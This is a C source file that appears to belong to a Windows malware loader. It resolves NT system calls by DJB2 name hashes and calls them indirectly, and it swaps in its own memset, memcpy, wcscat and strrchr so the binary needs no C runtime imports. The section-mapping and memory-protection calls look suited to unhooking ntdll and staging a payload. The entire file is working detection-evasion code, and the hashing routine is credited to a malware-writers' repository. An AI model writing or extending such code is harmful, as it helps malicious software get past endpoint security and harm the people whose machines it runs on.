#include <Windows.h>

#include "Common.h"
#include "Debug.h"



BOOL InitIndirectSyscalls(OUT PNT_API Nt) 
{

    if (Nt->bInit)
        return TRUE;

    if (!FetchNtSyscall(NtOpenSection_DJB2, &Nt->NtOpenSection)) {
#ifdef DEBUG
        PRINT("[!] Failed To Initialize \"NtOpenSection\" - %s.%d \n", GET_FILENAME(__FILE__), __LINE__);
#endif
        return FALSE;
    }

    if (!FetchNtSyscall(NtMapViewOfSection_DJB2, &Nt->NtMapViewOfSection)) {
#ifdef DEBUG
        PRINT("[!] Failed To Initialize \"NtMapViewOfSection\" - %s.%d \n", GET_FILENAME(__FILE__), __LINE__);
#endif
        return FALSE;
    }

    if (!FetchNtSyscall(NtProtectVirtualMemory_DJB2, &Nt->NtProtectVirtualMemory)) {
#ifdef DEBUG
        PRINT("[!] Failed To Initialize \"NtProtectVirtualMemory\" - %s.%d \n", GET_FILENAME(__FILE__), __LINE__);
#endif
        return FALSE;
    }

    if (!FetchNtSyscall(NtUnmapViewOfSection_DJB2, &Nt->NtUnmapViewOfSection)) {
#ifdef DEBUG
        PRINT("[!] Failed To Initialize \"NtUnmapViewOfSection\" - %s.%d \n", GET_FILENAME(__FILE__), __LINE__);
#endif
        return FALSE;
    }

    if (!FetchNtSyscall(NtAllocateVirtualMemory_DJB2, &Nt->NtAllocateVirtualMemory)) {
#ifdef DEBUG
        PRINT("[!] Failed To Initialize \"NtAllocateVirtualMemory\" - %s.%d \n", GET_FILENAME(__FILE__), __LINE__);
#endif
        return FALSE;
    }

    if (!FetchNtSyscall(NtDelayExecution_DJB2, &Nt->NtDelayExecution)) {
#ifdef DEBUG
        PRINT("[!] Failed To Initialize \"NtDelayExecution\" - %s.%d \n", GET_FILENAME(__FILE__), __LINE__);
#endif
        return FALSE;
    }

#ifdef DEBUG
    PRINT("[V] NtOpenSection [ SSN: 0x%0.8X - 'syscall' Address: 0x%p ] \n", Nt->NtOpenSection.dwSSn, Nt->NtOpenSection.pSyscallInstAddress);
    PRINT("[V] NtMapViewOfSection [ SSN: 0x%0.8X - 'syscall' Address: 0x%p ] \n", Nt->NtMapViewOfSection.dwSSn, Nt->NtMapViewOfSection.pSyscallInstAddress);
    PRINT("[V] NtProtectVirtualMemory [ SSN: 0x%0.8X - 'syscall' Address: 0x%p ] \n", Nt->NtProtectVirtualMemory.dwSSn, Nt->NtProtectVirtualMemory.pSyscallInstAddress);
    PRINT("[V] NtUnmapViewOfSection [ SSN: 0x%0.8X - 'syscall' Address: 0x%p ] \n", Nt->NtUnmapViewOfSection.dwSSn, Nt->NtUnmapViewOfSection.pSyscallInstAddress);
    PRINT("[V] NtAllocateVirtualMemory [ SSN: 0x%0.8X - 'syscall' Address: 0x%p ] \n", Nt->NtAllocateVirtualMemory.dwSSn, Nt->NtAllocateVirtualMemory.pSyscallInstAddress);
    PRINT("[V] NtDelayExecution [ SSN: 0x%0.8X - 'syscall' Address: 0x%p ] \n", Nt->NtDelayExecution.dwSSn, Nt->NtDelayExecution.pSyscallInstAddress);
#endif

    Nt->bInit = TRUE;

    return TRUE;
}



/*
*   An implementation of the 'djb2' string hashing algorithm
*   From : https://github.com/vxunderground/VX-API/blob/main/VX-API/HashStringDjb2.cpp
*/

DWORD HashStringDjb2A(IN LPCSTR String)
{
    ULONG Hash = 5381;
    INT c = 0;

    while (c = *String++)
        Hash = ((Hash << 5) + Hash) + c;

    return Hash;
}


/*
*   Custom random number generator using XORshift algorithm
*/
unsigned int GenerateRandomInt() 
{
    static unsigned int state = 123456789;
    state ^= state << 13;
    state ^= state >> 17;
    state ^= state << 5;
    return state;
}


// replaces the 'wcscat' function
VOID Wcscat(IN WCHAR* pDest, IN WCHAR* pSource) 
{

    while (*pDest != 0)
        pDest++;

    while (*pSource != 0) {
        *pDest = *pSource;
        pDest++;
        pSource++;
    }

    *pDest = 0;
}



// replaces the 'memcpy' function
VOID Memcpy(IN PVOID pDestination, IN PVOID pSource, SIZE_T sLength) 
{

    PBYTE D = (PBYTE)pDestination;
    PBYTE S = (PBYTE)pSource;

    while (sLength--)
        *D++ = *S++;
}


// replaces 'memset' while compiling
extern void* __cdecl memset(void*, int, size_t);

#pragma intrinsic(memset)
#pragma function(memset)
void* __cdecl memset(void* pTarget, int value, size_t cbTarget) {
    unsigned char* p = (unsigned char*)pTarget;
    while (cbTarget-- > 0) {
        *p++ = (unsigned char)value;
    }
    return pTarget;
}


// replaces 'strrchr' while compiling. 'strrchr' is called from the 'GET_FILENAME' macro located in the 'Debug.h' file
extern void* __cdecl strrchr(const char*, int);

#pragma intrinsic(strrchr)
#pragma function(strrchr)
char* strrchr(const char* str, int c) {
    char* last_occurrence = NULL;  
    while (*str) {
        if (*str == c) {
            last_occurrence = (char*)str;  
        }
        str++;
    }

    return last_occurrence;
}